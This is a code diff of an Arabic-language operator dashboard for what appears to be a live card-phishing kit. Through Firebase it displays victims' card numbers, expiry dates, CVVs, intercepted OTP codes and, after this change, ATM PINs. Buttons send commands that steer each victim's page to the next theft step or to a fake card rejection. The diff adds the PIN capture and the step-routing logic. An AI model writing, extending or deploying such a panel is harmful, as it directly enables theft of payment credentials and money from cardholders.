@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الرادار الموحد - المهندس حسن</title>
+    <title>لوحة تحكم العمليات</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     
@@ -12,20 +12,16 @@
         .header { background: #1a6d44; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-radius: 8px; margin-bottom: 20px; }
         .card { background: #1e1e1e; border-radius: 12px; padding: 15px; margin-bottom: 15px; position: relative; border-right: 8px solid #ffd700; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
         .client-id { background: #ffd700; color: black; padding: 3px 12px; border-radius: 4px; font-weight: bold; font-size: 13px; margin-bottom: 12px; display: inline-block; }
-        .status-badge { float: left; font-size: 11px; padding: 4px 8px; border-radius: 4px; background: #333; color: #bbb; }
         .data-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; clear: both; }
         .item { background: #282828; padding: 10px; border-radius: 6px; border: 1px solid #333; }
         .label { font-size: 10px; color: #888; display: block; margin-bottom: 4px; }
         .value { font-size: 14px; font-weight: bold; color: #fff; font-family: monospace; }
         .otp-box { border: 1px solid #e74c3c; background: #3d1a1a; }
-        .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; }
-        .btn { padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: white; transition: 0.2s; font-size: 12px; }
+        .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
+        .btn { padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: white; transition: 0.2s; font-size: 14px; }
         .btn:active { transform: scale(0.95); }
-        .btn-otp { background: #2ecc71; } /* أخضر - طلب OTP أول مرة */
-        .btn-wrong-otp { background: #f39c12; } /* برتقالي - خطأ OTP */
-        .btn-reject { background: #e74c3c; } /* أحمر - رفض البطاقة */
-        .btn-success { background: #3498db; } /* أزرق - نجاح نهائي */
-        .btn-wait { background: #555 !important; }
+        .btn-accept { background: #2ecc71; } /* قبول - يرسله لـ OTP أو PIN */
+        .btn-reject { background: #e74c3c; } /* رفض - يرجعه للبطاقة */
     </style>
 </head>
 <body onload="_init()">
@@ -33,8 +29,8 @@
 <audio id="alert_sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
 
 <div class="header">
-    <strong>لوحة تحكم العمليات (Saso) - المهندس حسن</strong>
-    <button onclick="_clear()" style="background:#c0392b; color:white; border:none; padding:8px 15px; border-radius:5px; cursor:pointer;">تصفير البيانات</button>
+    <strong>لوحة تحكم العمليات (Saso)</strong>
+    <button onclick="_clear()" style="background:#c0392b; color:white; border:none; padding:8px 15px; border-radius:5px; cursor:pointer;">تصفير</button>
 </div>
 
 <div id="monitor"></div>
@@ -56,39 +52,38 @@
             const orders = snapshot.val() || {};
             const monitor = document.getElementById('monitor');
             monitor.innerHTML = '';
-            
             const ids = Object.keys(orders).reverse();
 
             ids.forEach((id, index) => {
                 const d = orders[id];
                 const count = ids.length - index;
 
-                // نظام الصوت عند التحديث
                 const currentStr = JSON.stringify(d);
                 if(cache[id] && cache[id] !== currentStr) {
                     document.getElementById('alert_sound').play().catch(()=>{});
                 }
                 cache[id] = currentStr;
 
+                // تحديد الزرار هيودي فين بناءً على مكان العميل الحالي
+                // لو العميل لسه مدخل بطاقة، القبول يوديه OTP. لو مدخل OTP، القبول يوديه PIN.
+                let nextAction = 'go_to_otp';
+                if (d.otp_code || d.otp) {
+                    nextAction = 'go_to_pin'; 
+                }
+
                 const card = `
                     <div class="card">
-                        <span class="status-badge">${d.status || 'متصل الآن'}</span>
                         <span class="client-id">عميل #${count}</span>
-                        
                         <div class="data-grid">
-                            <div class="item"><span class="label">اسم العميل</span><span class="value">${d.fullName || '---'}</span></div>
-                            <div class="item"><span class="label">رقم البطاقة</span><span class="value">${d.cardNumber || '---'}</span></div>
-                            <div class="item"><span class="label">التاريخ</span><span class="value">${d.expiryDate || '--/--'}</span></div>
-                            <div class="item"><span class="label">CVV</span><span class="value">${d.cvv || '---'}</span></div>
-                            <div class="item otp-box"><span class="label">رمز OTP المستلم</span><span class="value" style="color:#00ff88; font-size:18px;">${d.otp_code || d.otp || 'بانتظار..'}</span></div>
-                            <div class="item"><span class="label">توقيت العملية</span><span class="value">${new Date(d.last_update).toLocaleTimeString('ar-SA')}</span></div>
+                            <div class="item"><span class="label">البطاقة</span><span class="value">${d.cardNumber || '---'}</span></div>
+                            <div class="item"><span class="label">التاريخ/CVV</span><span class="value">${d.expiryDate || '--/--'} | ${d.cvv || '---'}</span></div>
+                            <div class="item otp-box"><span class="label">رمز OTP</span><span class="value" style="color:#00ff88;">${d.otp_code || d.otp || 'بانتظار..'}</span></div>
+                            <div class="item"><span class="label">ATM PIN</span><span class="value" style="color:#ffd700;">${d.atm_pin || '---'}</span></div>
                         </div>
 
                         <div class="actions">
-                            <button class="btn btn-otp" onclick="_send('${id}', 'go_to_otp')">طلب OTP (أول مرة)</button>
-                            <button class="btn btn-wrong-otp" onclick="_send('${id}', 'wrong_otp')">OTP خطأ (إعادة)</button>
-                            <button class="btn btn-reject" onclick="_send('${id}', 'wrong_card')">رفض البطاقة (رجوع)</button>
-                            <button class="btn btn-success" onclick="_send('${id}', 'success')">إتمام العملية بنجاح</button>
+                            <button class="btn btn-accept" onclick="_send('${id}', '${nextAction}')">قبول وتوجيه</button>
+                            <button class="btn btn-reject" onclick="_send('${id}', 'wrong_card')">رفض البطاقة</button>
                         </div>
                     </div>
                 `;
@@ -98,22 +93,14 @@
     }
 
     function _send(id, step) {
-        // تحديث الفايربيس بالأمر الجديد
-        // نستخدم update مع إضافة وقت (timestamp) لضمان أن صفحة العميل "تحس" بالتغيير حتى لو نفس الأمر
         firebase.database().ref('orders/' + id).update({ 
             next_step: step,
-            last_command_time: new Date().getTime(),
-            status: "تم إرسال أمر: " + step
-        }).then(() => {
-            console.log("Command sent: " + step);
+            last_command_time: new Date().getTime()
         });
     }
 
     function _clear() {
-        if(confirm("هل أنت متأكد من مسح جميع بيانات العمليات؟")) {
-            firebase.database().ref('orders').remove();
-            firebase.database().ref('live_sessions').remove();
-        }
+        if(confirm("مسح الكل؟")) firebase.database().ref('orders').remove();
     }
 </script>
 </body>
